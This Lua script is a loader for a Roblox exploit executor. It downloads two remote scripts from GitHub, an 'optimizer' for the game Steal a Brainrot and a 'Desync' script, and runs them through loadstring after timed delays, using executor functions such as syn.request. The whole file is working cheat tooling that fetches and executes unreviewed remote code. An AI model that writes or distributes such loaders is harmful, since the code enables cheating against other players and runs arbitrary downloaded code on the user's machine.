local urls = {
    "https://raw.githubusercontent.com/zyklo01/Zyklo---optimizer/main/Steal%20a%20brainrot%20optimizar.lua",
    "https://raw.githubusercontent.com/zyklo01/Desync-zyklo/main/Desync.lua"
}

local function fetchUrl(url)
    local ok,res
    if syn and syn.request then
        ok,res=pcall(function() return syn.request({Url=url,Method="GET"}) end)
        if ok and res and (res.StatusCode==200 or res.Success) then return res.Body end
    end
    local req=http_request or http or (http and http.request)
    if req then
        ok,res=pcall(function() return req({Url=url,Method="GET"}) end)
        if ok and res then
            if type(res)=="table" and (res.Body or res.body) then return res.Body or res.body end
            if type(res)=="string" then return res end
        end
    end
    local s,h=pcall(function() return game:GetService("HttpService") end)
    if s and h then
        ok,res=pcall(function() return (game.HttpGet and game:HttpGet(url)) or h:GetAsync(url) end)
        if ok and type(res)=="string" then return res end
    end
end

local function waitHeartbeats(n)
    local RunService=game:GetService("RunService")
    for i=1,(n or 1) do
        local done=false
        local c
        c=RunService.Heartbeat:Connect(function() done=true c:Disconnect() end)
        local t0=tick()
        while not done and tick()-t0<1 do task.wait() end
    end
end

local function safeRun(code)
    local ld=load or loadstring
    if not ld or not code then return end
    local fn=ld(code,"remote")
    if fn then task.defer(fn) end
end

local codes={}
for i,u in ipairs(urls) do
    codes[i]=fetchUrl(u)
    task.wait(0.1)
end

for i=1,#codes do
    waitHeartbeats(10)
    task.wait(1)
    safeRun(codes[i])
    collectgarbage("collect")
    waitHeartbeats(10)
end
